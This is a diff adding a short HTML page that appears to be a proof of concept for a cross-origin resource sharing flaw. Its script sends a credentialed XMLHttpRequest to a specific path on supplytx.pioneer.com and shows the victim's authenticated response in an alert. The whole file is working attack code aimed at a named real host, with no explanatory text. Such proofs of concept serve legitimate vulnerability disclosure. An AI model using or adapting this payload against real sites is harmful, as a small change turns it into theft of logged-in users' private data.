@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var req = new XMLHttpRequest(); 
+req.onload = reqListener; 
+req.open('get','https://supplytx.pioneer.com/#/permFields/permField/177560?pchsId=CHA1-010-2019-3',true); 
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+    alert(this.responseText);
+};
+</script>
+</body>
+</html>
